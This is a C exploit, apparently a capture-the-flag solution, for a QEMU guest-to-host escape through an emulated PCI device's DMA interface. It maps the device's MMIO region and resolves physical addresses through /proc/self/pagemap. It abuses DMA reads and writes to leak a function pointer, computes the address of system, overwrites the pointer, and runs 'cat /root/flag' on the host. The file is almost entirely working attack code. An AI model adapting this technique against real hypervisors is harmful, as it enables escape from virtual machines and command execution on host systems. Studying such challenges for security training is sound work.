#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>   
#include <stdint.h>

#define DMABASE 0x40000
char *userbuf;
uint64_t userbuf_pa;
unsigned char *mmio_mem;

void mmio_write(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *((uint32_t*)(mmio_mem + addr));
}

size_t va2pa(void *addr){
    uint64_t data;

    int fd = open("/proc/self/pagemap",O_RDONLY);
    if (!fd){
        perror("open pagemap");
        return 0;
    }

    size_t pagesize = getpagesize();
    size_t offset = ((uintptr_t)addr / pagesize) * sizeof(uint64_t);

    if(lseek(fd,offset,SEEK_SET) < 0){
        puts("lseek");
        close(fd);
        return 0;
    }

    // 读取长度为 64 bits 的数据项
    if(read(fd,&data,8) != 8){
        puts("read");
        close(fd);
        return 0;
    }

    // 根据 Bit 63 判断物理内存页是否存在
    if (!(data & (((uint64_t) 1 << 63)))){
        puts("page");
        close(fd);
        return 0;
    }

    size_t pageframenum = data & ((1ull << 55) - 1);
    size_t phyaddr = pageframenum * pagesize + (uintptr_t)addr % pagesize;

    close(fd);
    return phyaddr;
}

void write_src(uint32_t src){
    mmio_write(0x80,src);
}

void write_dst(uint32_t dst){
    mmio_write(0x88,dst);
}

void write_cnt(uint32_t cnt){
    mmio_write(0x90,cnt);
}

void write_cmd(uint32_t cmd){
    mmio_write(0x98,cmd);
}

void read_enc_addr(){
    write_dst(userbuf_pa);
    write_src(0x41000);
    write_cnt(8);
    write_cmd(11);
    sleep(1);
}

void write_system_addr(void *buf,size_t len){
    assert(len<0x1000);

    //此处因为后续的cpu_physical_memory_rw函数里需要的地址是物理地址，所以是userbuf,其对应着buf存入到userbuf的数据
    memcpy(userbuf,buf,len);
    write_dst(0x41000);
    write_src(userbuf_pa);
    write_cnt(len);
    write_cmd(1);

    sleep(1);
}

void write_cat_addr(void *buf, size_t len){
    assert(len<0x1000);

    memcpy(userbuf,buf,len);

    write_dst(0x40100);
    write_src(userbuf_pa);
    write_cnt(len);
    write_cmd(1);

    sleep(1);
}

// 触发system("cat /root/flag")
void enc(){
    write_src(0x40100);
    write_cnt(0);
    write_cmd(7);
}

int main() {
    // O_RDWR 读、写打开,O_SYNC每次write都等到物理I/O完成
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0",O_RDWR | O_SYNC);
    // open failed
    if (mmio_fd == -1){
        perror("open mmio"); // perror（）用来将上一个函数发生错误的原因输出到标准设备
        exit(-1);
    }

    // MAP_SHARED对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。
    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED){
        perror("mmap mmio");
        exit(-1);
    }

    printf("mmio_mem:\t%p\n", mmio_mem);

    userbuf = mmap(0,0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1 ,0);
    if (userbuf == MAP_FAILED){
        perror("mmap userbuf");
        exit(-1);
    }

    mlock(userbuf, 0x1000);
    userbuf_pa = va2pa(userbuf);

    printf("userbuf_va:\t%p\n",userbuf);
    printf("userbuf_pa:\t%p\n",(void*)userbuf_pa);

    read_enc_addr();

    uint64_t leak_enc = *(uint64_t*)userbuf;
    printf("enc_addr:\t%p\n",(void*)leak_enc);

    uint64_t addr_base = leak_enc - 0x283dd0;
    printf("addr_base:\t%p\n",(void*)addr_base);

    uint64_t system_plt = addr_base + 0x1fdb18;
    printf("system_plt:\t%p\n",(void*)system_plt);

    // 将system地址写入到enc指针里
    write_system_addr(&system_plt,8);

    char *cat_flag = "cat /root/flag\x00";
    write_cat_addr(cat_flag,strlen(cat_flag));
    enc();
    return 0;
}